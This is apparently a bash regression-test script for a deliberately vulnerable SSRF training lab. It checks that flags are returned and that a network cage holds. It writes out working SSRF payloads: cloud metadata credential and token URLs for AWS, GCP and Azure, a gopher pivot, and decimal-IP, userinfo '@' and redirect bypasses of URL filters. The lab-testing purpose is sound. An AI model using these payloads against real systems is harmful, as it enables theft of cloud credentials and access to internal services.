#!/usr/bin/env bash
# Acceptance checks for ssrf.vulnlab.dev.
#
# Runs every canonical exploit listed in CLAUDE.md and verifies its success
# marker appears in the response. Also verifies the systemd network cage
# (RFC1918 denied, link-local IMDS allowed) and that every lab exposes
# /source/<slug> and /meta/<slug>.
#
# Usage:
#   ./scripts/check-ssrf.sh                       # checks https://ssrf.vulnlab.dev
#   BASE_URL=http://127.0.0.1:8082 ./scripts/check-ssrf.sh
#
# Exit code 0 = all pass. Nonzero = at least one regression.
set -u

BASE_URL="${BASE_URL:-https://ssrf.vulnlab.dev}"
CURL_OPTS=(--silent --show-error --max-time 15 --fail-with-body)

pass=0
fail=0
failures=()

# --- helpers -----------------------------------------------------------------

# expect_body <label> <url> <expected substring>
expect_body() {
    local label="$1" url="$2" needle="$3"
    local body
    body="$(curl "${CURL_OPTS[@]}" "$url" 2>&1)" || true
    if printf '%s' "$body" | grep -qF -- "$needle"; then
        printf '  \e[32mOK\e[0m   %s\n' "$label"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s\n' "$label"
        printf '       url:    %s\n' "$url"
        printf '       wanted: %s\n' "$needle"
        printf '       got:    %s\n' "$(printf '%s' "$body" | head -c 300)"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

# expect_status <label> <url> <expected http code>
expect_status() {
    local label="$1" url="$2" want="$3"
    local code
    code="$(curl --silent --output /dev/null --max-time 15 --write-out '%{http_code}' "$url" || true)"
    if [[ "$code" == "$want" ]]; then
        printf '  \e[32mOK\e[0m   %s (got %s)\n' "$label" "$code"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s (wanted %s, got %s)\n' "$label" "$want" "$code"
        printf '       url:    %s\n' "$url"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

# expect_network_blocked <label> <inner-url>
# Hits /basic/?url=<inner-url>; the page should render with an Exception
# substring (not the body of the inner target), meaning systemd's
# IPAddressDeny prevented the connect.
expect_network_blocked() {
    local label="$1" inner="$2"
    local body
    body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode "url=$inner" "$BASE_URL/basic/" 2>&1)" || true
    # On block: requests raises ConnectionError / ConnectTimeout / etc., which
    # the lab renders as "<ExceptionName>: ...".
    if printf '%s' "$body" | grep -qE 'Error:.*(Connection|Timeout|Permission|Network is unreachable|refused|Failed to establish|cannot connect)'; then
        printf '  \e[32mOK\e[0m   %s (cage held)\n' "$label"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s — request was NOT blocked\n' "$label"
        printf '       inner:  %s\n' "$inner"
        printf '       got:    %s\n' "$(printf '%s' "$body" | head -c 300)"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

section() { printf '\n\e[1m== %s ==\e[0m\n' "$1"; }

# --- canonical exploits ------------------------------------------------------

section "Canonical exploits (CLAUDE.md ground truth)"

expect_body "basic SSRF → internal /secret" \
    "$BASE_URL/basic/?url=http://127.0.0.1:8089/secret" \
    "VULNLAB{ssrf-reached-internal-service}"

expect_body "webhook → header-leaked flag" \
    "$BASE_URL/webhook/?url=http://127.0.0.1:8089/webhook-callback" \
    "VULNLAB{ssrf-webhook-leaked-via-headers}"

expect_body "gopher → fake redis-like service" \
    "$BASE_URL/gopher/?url=gopher://127.0.0.1:6479/_PING%0d%0a" \
    "VULNLAB{ssrf-gopher-pivot-to-redis-like-service}"

expect_body "AWS IMDS → fake creds" \
    "$BASE_URL/metadata/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnlab-imds-test-role" \
    "AKIAIOSFODNN7EXAMPLE"

expect_body "GCP metadata → token marker" \
    "$BASE_URL/metadata-gcp/?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
    "VULNLAB{ssrf-gcp-metadata-token-leaked}"

# Azure inner URL has a ?query, must encode.
azure_inner='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
azure_url="$(printf '%s' "$BASE_URL/metadata-azure/" )?$(printf 'url=%s' "$azure_inner" | sed 's/&/%26/g; s/?/%3F/g; s|:|%3A|2g')"
# Simpler: use --get --data-urlencode via a small inline curl
azure_body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode "url=$azure_inner" "$BASE_URL/metadata-azure/" 2>&1)" || true
if printf '%s' "$azure_body" | grep -qF -- 'VULNLAB{ssrf-azure-msi-token-leaked}'; then
    printf '  \e[32mOK\e[0m   Azure MSI → token marker\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m Azure MSI → token marker\n'
    printf '       got: %s\n' "$(printf '%s' "$azure_body" | head -c 300)"
    fail=$((fail + 1))
    failures+=("Azure MSI → token marker")
fi

# --- secondary exploits (variants worth re-running) --------------------------

section "Secondary exploits"

expect_body "blocklist bypass (decimal IP)" \
    "$BASE_URL/blocklist/?url=http://2130706433:8089/secret" \
    "VULNLAB{ssrf-reached-internal-service}"

expect_body "allowlist bypass (substring in path)" \
    "$BASE_URL/allowlist/?url=http://127.0.0.1:8089/secret%3Fx%3Dvulnlab.dev" \
    "VULNLAB{ssrf-reached-internal-service}"

# parser bypass uses userinfo; the @ must not be encoded.
parser_body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode 'url=http://images.vulnlab.dev@127.0.0.1:8089/secret' "$BASE_URL/parser/" 2>&1)" || true
if printf '%s' "$parser_body" | grep -qF -- "VULNLAB{ssrf-reached-internal-service}"; then
    printf '  \e[32mOK\e[0m   parser bypass (userinfo @ trick)\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m parser bypass (userinfo @ trick)\n'
    printf '       got: %s\n' "$(printf '%s' "$parser_body" | head -c 300)"
    fail=$((fail + 1))
    failures+=("parser bypass")
fi

redirect_body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode "url=$BASE_URL/r/?to=http://127.0.0.1:8089/secret" "$BASE_URL/redirect/" 2>&1)" || true
if printf '%s' "$redirect_body" | grep -qF -- "VULNLAB{ssrf-reached-internal-service}"; then
    printf '  \e[32mOK\e[0m   redirect → 302 to internal\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m redirect → 302 to internal\n'
    printf '       got: %s\n' "$(printf '%s' "$redirect_body" | head -c 300)"
    fail=$((fail + 1))
    failures+=("redirect chain")
fi

# --- network cage (load-bearing!) --------------------------------------------

section "Network cage (systemd IPAddressDeny / Allow)"

expect_network_blocked "10.0.0.0/8 must be denied" "http://10.10.10.10/"
expect_network_blocked "192.168.0.0/16 must be denied" "http://192.168.1.1/"

# IMDS /32 allow must beat the 169.254.0.0/16 deny.
expect_body "169.254.169.254 must be reachable (IMDS allow)" \
    "$BASE_URL/basic/?url=http://169.254.169.254/latest/meta-data/instance-id" \
    "i-0deadbeef0123abcd"

# --- /source/<slug> and /meta/<slug> coverage --------------------------------

section "Source + meta coverage"

SLUGS=(basic blocklist allowlist parser redirect scheme blind webhook metadata metadata-gcp metadata-azure gopher)
for slug in "${SLUGS[@]}"; do
    expect_status "/source/$slug" "$BASE_URL/source/$slug" "200"
done
for slug in "${SLUGS[@]}"; do
    # /meta/<slug> should return JSON with a "detect" key.
    body="$(curl "${CURL_OPTS[@]}" "$BASE_URL/meta/$slug" 2>&1)" || true
    if printf '%s' "$body" | grep -q '"detect"'; then
        printf '  \e[32mOK\e[0m   /meta/%s has detect block\n' "$slug"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m /meta/%s missing detect block\n' "$slug"
        fail=$((fail + 1))
        failures+=("/meta/$slug")
    fi
done

# --- summary -----------------------------------------------------------------

section "Summary"
printf '  passed: %d\n  failed: %d\n' "$pass" "$fail"

if (( fail > 0 )); then
    printf '\n\e[31mFAILURES:\e[0m\n'
    for f in "${failures[@]}"; do
        printf '  - %s\n' "$f"
    done
    exit 1
fi
exit 0
